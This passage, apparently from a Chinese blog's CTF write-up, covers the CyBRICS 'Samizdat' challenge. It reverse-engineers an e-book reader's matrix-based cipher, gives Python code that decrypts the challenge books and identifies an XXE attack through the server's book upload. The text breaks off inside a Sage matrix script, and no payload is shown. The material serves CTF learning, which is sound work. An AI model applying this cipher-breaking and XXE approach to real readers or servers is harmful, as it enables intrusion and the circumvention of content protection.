<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>CyBRICS CTF Samizdat Writeup - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.
(早知道早点起床做题了"><meta property="og:image" content><meta property="og:title" content="CyBRICS CTF Samizdat Writeup"><meta property="og:description" content="这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.
(早知道早点起床做题了"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2019/07/22/CyBRICS-CTF-Samizdat-Writeup/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-07-22T09:56:31+00:00"><meta property="article:modified_time" content="2019-07-22T09:56:31+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CyBRICS CTF Samizdat Writeup"><meta name=twitter:description content="这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.
(早知道早点起床做题了"><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.adee9cfbd354daaeb33dace537964a63d82b2251776e6faa9b2b77ed0860ce11.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.edf79541ec4ce8eb7c41e94c73563068c3e0a2637547bb1abb19618cb525a38d.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>CyBRICS CTF Samizdat Writeup</h1><div class=meta>发表于 2019 年 7 月 22 日</div></div><section class=body><p>这题是在比赛结束后才做出来的, 比较可惜, 但是题目本身还是比较有意思的, 所以写个 Writeup.<br>(早知道早点起床做题了</p><p>首先打开来可以下载</p><ul><li>阅读器</li><li>guide.txt</li><li>两本加密过的书</li></ul><p>其中阅读器能解密书, 但是只能读前 100 页, 接下来自然是 IDA F5 伺候一下阅读器,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#ff79c6>if</span> ( (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span>)decrypt((<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span> <span style=color:#ff79c6>*</span>)ptr, n, <span style=color:#ff79c6>&amp;</span>v11, <span style=color:#ff79c6>&amp;</span>v12) )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v9 <span style=color:#ff79c6>=</span> std<span style=color:#ff79c6>::</span><span style=color:#ff79c6>operator</span><span style=color:#ff79c6>&lt;&lt;&lt;</span>std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span>(<span style=color:#ff79c6>&amp;</span>_bss_start, <span style=color:#f1fa8c>&#34;Failed to decrypt book&#34;</span>);
</span></span><span style=display:flex><span>      std<span style=color:#ff79c6>::</span>ostream<span style=color:#ff79c6>::</span><span style=color:#ff79c6>operator</span><span style=color:#ff79c6>&lt;&lt;</span>(v9, <span style=color:#ff79c6>&amp;</span>std<span style=color:#ff79c6>::</span>endl<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span>,std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>else</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v7 <span style=color:#ff79c6>=</span> decompress_book(v11, v12, <span style=color:#ff79c6>&amp;</span>v14, <span style=color:#ff79c6>&amp;</span>v13);
</span></span><span style=display:flex><span>      free(ptr);
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>if</span> ( v7 )
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        v8 <span style=color:#ff79c6>=</span> std<span style=color:#ff79c6>::</span><span style=color:#ff79c6>operator</span><span style=color:#ff79c6>&lt;&lt;&lt;</span>std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span>(<span style=color:#ff79c6>&amp;</span>_bss_start, <span style=color:#f1fa8c>&#34;Failed to decompress book&#34;</span>);
</span></span><span style=display:flex><span>        std<span style=color:#ff79c6>::</span>ostream<span style=color:#ff79c6>::</span><span style=color:#ff79c6>operator</span><span style=color:#ff79c6>&lt;&lt;</span>(v8, <span style=color:#ff79c6>&amp;</span>std<span style=color:#ff79c6>::</span>endl<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span>,std<span style=color:#ff79c6>::</span>char_traits<span style=color:#ff79c6>&lt;</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>&gt;&gt;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>1</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      read_book(v14, v3, v13);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>发现其实就是解密 + zlib 解压缩, 然后小说本体保存形式是 xml, 用 libxml 来解析.</p><p>接下来逆向解密算法, 发现在 decrypt 里面调用了 decrypt_block, 实际上是分块密码, 每 16 字节分块解密, 而 decrypt_block 的实现如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>ptr <span style=color:#ff79c6>=</span> malloc(<span style=color:#bd93f9>0x10uLL</span>);
</span></span><span style=display:flex><span>  <span style=color:#ff79c6>for</span> ( i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;=</span> <span style=color:#bd93f9>15</span>; <span style=color:#ff79c6>++</span>i )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> ( j <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; j <span style=color:#ff79c6>&lt;=</span> <span style=color:#bd93f9>15</span>; <span style=color:#ff79c6>++</span>j )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      v1 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
</span></span><span style=display:flex><span>      <span style=color:#ff79c6>for</span> ( k <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; k <span style=color:#ff79c6>&lt;=</span> <span style=color:#bd93f9>15</span>; <span style=color:#ff79c6>++</span>k )
</span></span><span style=display:flex><span>        v1 <span style=color:#ff79c6>+=</span> Mminus[<span style=color:#bd93f9>16</span> <span style=color:#ff79c6>*</span> k <span style=color:#ff79c6>+</span> j] <span style=color:#ff79c6>*</span> a1[k];
</span></span><span style=display:flex><span>      ptr[j] <span style=color:#ff79c6>=</span> v1;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> ( l <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; l <span style=color:#ff79c6>&lt;=</span> <span style=color:#bd93f9>15</span>; <span style=color:#ff79c6>++</span>l )
</span></span><span style=display:flex><span>      a1[l] <span style=color:#ff79c6>=</span> ptr[(<span style=color:#8be9fd>unsigned</span> <span style=color:#ff79c6>__int8</span>)Pminus[l]];
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  free(ptr);
</span></span></code></pre></div><p>转成 python 代码可能更容易看懂, 其中 Mminus 是大小 256 的数组, Pminus 是大小 16 的数组,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>decrypt_block</span>(block):
</span></span><span style=display:flex><span>    block <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(block)
</span></span><span style=display:flex><span>    ptr <span style=color:#ff79c6>=</span> [<span style=color:#bd93f9>0</span> <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>)]
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> j <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>            t <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> k <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>                t <span style=color:#ff79c6>+=</span> Mminus[<span style=color:#bd93f9>16</span> <span style=color:#ff79c6>*</span> k <span style=color:#ff79c6>+</span> j] <span style=color:#ff79c6>*</span> block[k]
</span></span><span style=display:flex><span>            ptr[j] <span style=color:#ff79c6>=</span> t <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> l <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>            block[l] <span style=color:#ff79c6>=</span> ptr[Pminus[l]]
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> block
</span></span></code></pre></div><p>学过线性代数可以看出, 其实就是算了个矩阵乘法, 然后置换一下, Mminus 就是个 16 * 16 的矩阵.</p><p>搞懂之后就可以写算法解密了,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>Mminus <span style=color:#ff79c6>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>128</span>, <span style=color:#bd93f9>251</span>, <span style=color:#bd93f9>9</span>, <span style=color:#bd93f9>168</span>, <span style=color:#bd93f9>169</span>, <span style=color:#bd93f9>158</span>, <span style=color:#bd93f9>82</span>, <span style=color:#bd93f9>7</span>, <span style=color:#bd93f9>213</span>, <span style=color:#bd93f9>229</span>, <span style=color:#bd93f9>180</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>172</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>215</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>113</span>, <span style=color:#bd93f9>44</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>5</span>, <span style=color:#bd93f9>22</span>, <span style=color:#bd93f9>41</span>, <span style=color:#bd93f9>89</span>, <span style=color:#bd93f9>130</span>, <span style=color:#bd93f9>171</span>, <span style=color:#bd93f9>42</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>122</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>36</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>127</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>246</span>, <span style=color:#bd93f9>241</span>, <span style=color:#bd93f9>34</span>, <span style=color:#bd93f9>33</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>105</span>, <span style=color:#bd93f9>228</span>, <span style=color:#bd93f9>82</span>, <span style=color:#bd93f9>86</span>, <span style=color:#bd93f9>43</span>, <span style=color:#bd93f9>81</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>161</span>, <span style=color:#bd93f9>104</span>, <span style=color:#bd93f9>26</span>, <span style=color:#bd93f9>102</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>143</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>142</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>141</span>, <span style=color:#bd93f9>241</span>, <span style=color:#bd93f9>71</span>, <span style=color:#bd93f9>237</span>, <span style=color:#bd93f9>153</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>159</span>, <span style=color:#bd93f9>65</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>231</span>, <span style=color:#bd93f9>133</span>, <span style=color:#bd93f9>139</span>, <span style=color:#bd93f9>200</span>, <span style=color:#bd93f9>78</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>197</span>, <span style=color:#bd93f9>62</span>, <span style=color:#bd93f9>167</span>, <span style=color:#bd93f9>79</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>164</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>120</span>, <span style=color:#bd93f9>15</span>, <span style=color:#bd93f9>48</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>62</span>, <span style=color:#bd93f9>163</span>, <span style=color:#bd93f9>231</span>, <span style=color:#bd93f9>118</span>, <span style=color:#bd93f9>173</span>, <span style=color:#bd93f9>36</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>123</span>, <span style=color:#bd93f9>165</span>, <span style=color:#bd93f9>5</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>106</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>156</span>, <span style=color:#bd93f9>145</span>, <span style=color:#bd93f9>228</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>164</span>, <span style=color:#bd93f9>50</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>230</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>76</span>, <span style=color:#bd93f9>208</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>67</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>246</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>54</span>, <span style=color:#bd93f9>107</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>172</span>, <span style=color:#bd93f9>92</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>102</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>1</span>, <span style=color:#bd93f9>21</span>, <span style=color:#bd93f9>80</span>, <span style=color:#bd93f9>145</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>176</span>, <span style=color:#bd93f9>31</span>, <span style=color:#bd93f9>250</span>, <span style=color:#bd93f9>68</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>94</span>, <span style=color:#bd93f9>112</span>, <span style=color:#bd93f9>161</span>, <span style=color:#bd93f9>234</span>, <span style=color:#bd93f9>223</span>, <span style=color:#bd93f9>204</span>, <span style=color:#bd93f9>79</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>222</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>188</span>, <span style=color:#bd93f9>221</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>112</span>, <span style=color:#bd93f9>10</span>, <span style=color:#bd93f9>80</span>, <span style=color:#bd93f9>103</span>, <span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>139</span>, <span style=color:#bd93f9>178</span>, <span style=color:#bd93f9>137</span>, <span style=color:#bd93f9>128</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>192</span>, <span style=color:#bd93f9>57</span>, <span style=color:#bd93f9>24</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>252</span>, <span style=color:#bd93f9>140</span>, <span style=color:#bd93f9>90</span>, <span style=color:#bd93f9>250</span>, <span style=color:#bd93f9>132</span>, <span style=color:#bd93f9>220</span>, <span style=color:#bd93f9>194</span>, <span style=color:#bd93f9>154</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>114</span>, <span style=color:#bd93f9>55</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>27</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>61</span>, <span style=color:#bd93f9>196</span>, <span style=color:#bd93f9>244</span>, <span style=color:#bd93f9>42</span>, <span style=color:#bd93f9>191</span>, <span style=color:#bd93f9>242</span>, <span style=color:#bd93f9>188</span>, <span style=color:#bd93f9>254</span>, <span style=color:#bd93f9>166</span>, <span style=color:#bd93f9>59</span>, <span style=color:#bd93f9>232</span>, <span style=color:#bd93f9>94</span>, <span style=color:#bd93f9>237</span>, <span style=color:#bd93f9>209</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>192</span>, <span style=color:#bd93f9>58</span>, <span style=color:#bd93f9>47</span>, <span style=color:#bd93f9>238</span>, <span style=color:#bd93f9>147</span>, <span style=color:#bd93f9>6</span>, <span style=color:#bd93f9>244</span>, <span style=color:#bd93f9>230</span>, <span style=color:#bd93f9>134</span>, <span style=color:#bd93f9>184</span>, <span style=color:#bd93f9>235</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>53</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>248</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>117</span>, <span style=color:#bd93f9>158</span>, <span style=color:#bd93f9>17</span>, <span style=color:#bd93f9>87</span>, <span style=color:#bd93f9>247</span>, <span style=color:#bd93f9>205</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>123</span>, <span style=color:#bd93f9>255</span>, <span style=color:#bd93f9>3</span>, <span style=color:#bd93f9>89</span>, <span style=color:#bd93f9>11</span>, <span style=color:#bd93f9>98</span>, <span style=color:#bd93f9>58</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>181</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>236</span>, <span style=color:#bd93f9>40</span>, <span style=color:#bd93f9>99</span>, <span style=color:#bd93f9>141</span>, <span style=color:#bd93f9>232</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>85</span>, <span style=color:#bd93f9>100</span>, <span style=color:#bd93f9>205</span>, <span style=color:#bd93f9>190</span>, <span style=color:#bd93f9>84</span>, <span style=color:#bd93f9>226</span>, <span style=color:#bd93f9>217</span>, <span style=color:#bd93f9>214</span>, <span style=color:#bd93f9>115</span>, <span style=color:#bd93f9>62</span>,
</span></span><span style=display:flex><span>    <span style=color:#bd93f9>216</span>, <span style=color:#bd93f9>239</span>, <span style=color:#bd93f9>44</span>, <span style=color:#bd93f9>111</span>, <span style=color:#bd93f9>69</span>, <span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>142</span>, <span style=color:#bd93f9>248</span>, <span style=color:#bd93f9>240</span>, <span style=color:#bd93f9>180</span>, <span style=color:#bd93f9>157</span>, <span style=color:#bd93f9>41</span>, <span style=color:#bd93f9>105</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>Pminus <span style=color:#ff79c6>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\f</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x0F</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x0E</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\b</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x03</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\v</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\r</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\0</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\a</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\t</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x06</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x02</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x01</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x05</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>\x04</span><span style=color:#f1fa8c>&#39;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> zlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> seq, c <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>enumerate</span>(Pminus):
</span></span><span style=display:flex><span>    Pminus[seq] <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>ord</span>(c)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>f <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;3ba9318b509034cb7b506df0faef4d80.fb2enc&#39;</span>, <span style=color:#f1fa8c>&#39;rb&#39;</span>)<span style=color:#ff79c6>.</span>read()
</span></span><span style=display:flex><span><span style=color:#6272a4>#f = open(&#39;6506dad64d2353f25cca891f81443a8e.fb2enc&#39;, &#39;rb&#39;).read()</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>decrypt_block</span>(block):
</span></span><span style=display:flex><span>    block <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>(block)
</span></span><span style=display:flex><span>    ptr <span style=color:#ff79c6>=</span> {}
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> j <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>            t <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> k <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>                t <span style=color:#ff79c6>+=</span> Mminus[<span style=color:#bd93f9>16</span> <span style=color:#ff79c6>*</span> k <span style=color:#ff79c6>+</span> j] <span style=color:#ff79c6>*</span> block[k]
</span></span><span style=display:flex><span>            ptr[j] <span style=color:#ff79c6>=</span> t <span style=color:#ff79c6>%</span> <span style=color:#bd93f9>256</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>for</span> l <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>            block[l] <span style=color:#ff79c6>=</span> ptr[Pminus[l]]
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> block
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>book <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>bytearray</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>0</span>, <span style=color:#8be9fd;font-style:italic>len</span>(f), <span style=color:#bd93f9>16</span>):
</span></span><span style=display:flex><span>    book<span style=color:#ff79c6>.</span>extend(decrypt_block(f[i:i <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>16</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dec <span style=color:#ff79c6>=</span> zlib<span style=color:#ff79c6>.</span>decompress(<span style=color:#8be9fd;font-style:italic>bytes</span>(book))
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;output2.xml&#39;</span>, <span style=color:#f1fa8c>&#39;wb&#39;</span>)<span style=color:#ff79c6>.</span>write(dec)
</span></span></code></pre></div><p>然后解密给的两本书, 发现里面真的就是两本小说 (<br>而且正文都是西里尔字母, 也看不懂 233</p><p>接下来的目标应该不是这两本小说, 再回到网站.<br>访问 robots.txt, 发现给了提示</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>User-agent: *
</span></span><span style=display:flex><span>Disallow: /authorszone
</span></span></code></pre></div><p>在 <code>http://45.77.219.97/authorszone</code> 里面是上传书的地方, 而且只能上传加密过后的书.<br>再结合之前书的本体是 xml, 那么可以想到是 XXE 了.<br>接下来是写出加密算法, 实际上就是矩阵方程求解, 因为是 mod 256 整数环上的矩阵, 直接用 sage 来算了.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4># This file was *autogenerated* from the file matrix.sage</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> sage.all_cmdline <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>   <span style=color:#6272a4># import sage library</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_sage_const_256 <span style=color:#ff79c6>=</span> Integer(<span style=color:#bd93f9>256</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_solve</span>(y):
</span></span><span style=display:flex><span>    mat <span style=color:#ff79c6>=</span> [[<span style=color:#bd93f9>135</span>, <span style=color:#bd93f9>172</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>43</span>, <span style=color:#bd93f9>153</span>, <span style=color:#bd93f9>164</span>, <span style=color:#bd93f9>5</span>, <span style=color:#bd93f9>208</span>, <span style=color:#bd93f9>80</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>137</span>, <span style=color:#bd93f9>114</span>, <span style=color:#bd93f9>237</span>, <span style=color:#bd93f9>121</span>, <span style=color:#bd93f9>58</span>, <span style=color:#bd93f9>214</span>], [<span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>215</span>, <span style=color:#bd93f9>36</span>, <span style=color:#bd93f9>81</span>, <span style=color:#bd93f9>159</span>, <span style=color:#bd93f9>120</span>, <span style=color:#bd93f9>106</span>, <span style=color:#bd93f9>67</span>, <span style=color:#bd93f9>145</span>, <span style=color:#bd93f9>222</span>, <span style=color:#bd93f9>128</span>, <span style=color:#bd93f9>55</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>248</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>115</span>], [<span style=color:#bd93f9>77</span>, <span style=color:#bd93f9>32</span>, <span style=color:#bd93f9>125</span>, <span style=color:#bd93f9>161</span>, <span style=color:#bd93f9>65</span>, <span style=color:#bd93f9>15</span>, <span style=color:#bd93f9>129</span>, <span style=color:#bd93f9>38</span>, <span style=color:#bd93f9>209</span>, <span style=color:#bd93f9>16</span>, <span style=color:#bd93f9>192</span>, <span style=color:#bd93f9>27</span>, <span style=color:#bd93f9>192</span>, <span style=color:#bd93f9>117</span>, <span style=color:#bd93f9>181</span>, <span style=color:#bd93f9>62</span>], [<span style=color:#bd93f9>128</span>, <span style=color:#bd93f9>243</span>, <span style=color:#bd93f9>25</span>, <span style=color:#bd93f9>104</span>, <span style=color:#bd93f9>0</span>, <span style=color:#bd93f9>48</span>, <span style=color:#bd93f9>156</span>, <span style=color:#bd93f9>0</span>, <span 